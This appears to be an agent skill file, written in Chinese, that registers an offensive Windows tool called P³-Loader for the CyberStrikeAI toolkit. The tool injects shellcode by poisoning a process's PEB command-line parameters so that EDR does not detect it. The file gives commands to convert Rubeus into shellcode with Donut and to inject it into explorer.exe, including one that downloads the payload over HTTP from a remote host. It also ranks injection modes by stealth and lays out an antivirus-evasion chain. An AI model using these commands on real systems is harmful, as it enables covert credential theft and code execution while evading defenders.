---
name: p3-shellcode-loader
description: P³ (Process Parameter Poisoning) — 高级 Windows Shellcode 注入技术 PE Loader。利用 PEB 中 Process Parameters 结构作为 Shellcode 暂存区，通过修改进程命令行伪装进程启动参数，规避 VirtualAllocEx/WriteProcessMemory 检测。Max Hirschberger & Ogulcan '0xrecon' Ugur 学术研究项目。触发词：p3-loader、PEB注入、shellcode、进程注入、参数投毒、PE loader、process hollowing、VirtualAlloc绕过。
version: 1.0.0
---

# P³-Loader — Process Parameter Poisoning Shellcode Loader

## 概述

P³-Loader（Process Parameter Poisoning PE Loader）是由 Max Hirschberger 和 Ogulcan "0xrecon" Ugur 开发的**高级 Windows Shellcode 注入与 PE 加载工具**。核心创新在于利用 PEB 中的 `Process Parameters` 结构作为 shellcode 暂存区，通过**投毒进程命令行参数**来绕过典型的 EDR 检测。

```
传统注入:                    P³ 注入:
VirtualAllocEx ──→ [检测!]   修改 PEB.ProcessParameters ──→ [无传统API调用]
WriteProcessMemory ──→ [检测!]   ↓
CreateRemoteThread ──→ [检测!]  伪装成命令行参数 ──→ 执行
                                  ↓
                             EDR: "只是个命令行参数而已..."
```

## 技术原理

```
Windows 进程结构:
PEB (Process Environment Block)
 ├── ImageBaseAddress
 ├── Ldr (Loaded Modules)
 └── ProcessParameters    ← P³ 攻击点
      ├── CommandLine     ← 被投毒的命令行
      ├── ImagePathName
      └── Environment

P³ 攻击链:
① 获取目标进程 PEB → ② 修改 ProcessParameters.CommandLine
   → ③ 嵌入 Shellcode 到命令行内存 → ④ 通过 APC/Thread 执行
```

## 功能特性

| 功能 | 说明 |
|------|------|
| **PE → Shellcode** | 将 Windows .exe 转换为位置无关 shellcode |
| **HTTP 下载** | 从 HTTP 服务器拉取 PE 文件（Staging） |
| **内存执行** | 无需落地磁盘，纯内存加载 |
| **PEB 投毒** | 利用 Process Parameters 结构绕过内存扫描 |
| **API 动态解析** | 运行时解析 Windows API，无 IAT 特征 |
| **交互式菜单** | 图形化 TCUI 操作界面 |

## 安装位置

```
/root/CyberStrikeAI-1.7.6/tools/p3-shellcode-loader/
├── P3-Loader.cpp          # 主入口 + PEB 操作
├── HTTPClient.cpp/.h      # HTTP PE 下载器
├── ShellCodeWriter.cpp/.h # PE → Shellcode 转换
├── WinApiResolver.cpp/.h  # 动态 API 解析
├── Menu.cpp/.h            # 交互式终端 UI
├── ShellCodeUserInput.cpp # 用户输入处理
├── P3-Loader.vcxproj      # Visual Studio 项目
└── README.md              # 完整文档
```

> ⚠️ 此工具为 **Windows 专用 C++ 项目**（需 Visual Studio 编译），本机无法直接编译。用于 Windows 红队操作时将源码复制到 Windows 编译环境。

## 渗透测试中使用

### 攻击链组合

```bash
# 第一步: 用 Donut 将 .NET 工具转为 shellcode
python3 /root/CyberStrikeAI-1.7.6/tools/donut-customhost/donut_wrapper.py \
  Rubeus.exe -o rubeus.bin -b -e 3

# 第二步: 在 Windows 上用 P3-Loader 加载 shellcode
# P3-Loader.exe --file rubeus.bin --target explorer.exe --inject PEB

# 或者直接 HTTP 拉取执行
# P3-Loader.exe --url http://192.168.1.100/rubeus.bin --target explorer.exe
```

### 三种注入模式

| 模式 | 命令 | 检测难度 |
|------|------|---------|
| **PEB 投毒** | `--inject PEB` | ⭐⭐⭐⭐⭐ 最难检测 |
| **APC 注入** | `--inject APC` | ⭐⭐⭐⭐ |
| **远程线程** | `--inject Thread` | ⭐⭐ 最易检测 |

## 免杀组合方案

```
┌─────────────┐    ┌──────────┐    ┌───────────┐    ┌──────────┐
│ Donut       │ → │ P³-Loader│ → │ VoidShell │ → │ 目标Linux│
│ (.NET→sc)   │    │ (PEB注入) │    │ (Linux)   │    │          │
└─────────────┘    └──────────┘    └───────────┘    └──────────┘
       ↓                ↓
  CustomHost       PEB 投毒
  ETW Bypass       避 API Hook
```

## 作者

- Max Hirschberger — University of Applied Sciences Worms
- Ogulcan '0xrecon' Ugur — University of Applied Sciences Worms
